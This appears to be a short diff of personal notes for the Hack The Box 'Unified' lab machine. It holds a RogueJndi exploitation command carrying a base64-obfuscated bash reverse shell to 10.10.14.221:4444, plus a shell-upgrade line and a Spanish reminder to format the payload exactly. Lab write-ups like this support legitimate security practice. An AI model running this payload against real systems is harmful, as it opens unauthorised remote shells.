@@ -1,0 +1,6 @@
+HACK THE BOX - UNIFIED MACHINE
+
+
+
+- java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjIxLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.221"                   -Tener mucho cuidado con los espacios y comas, todo debe ir correctamente sino la conexión no será posible
+- script /dev/null -c bash 
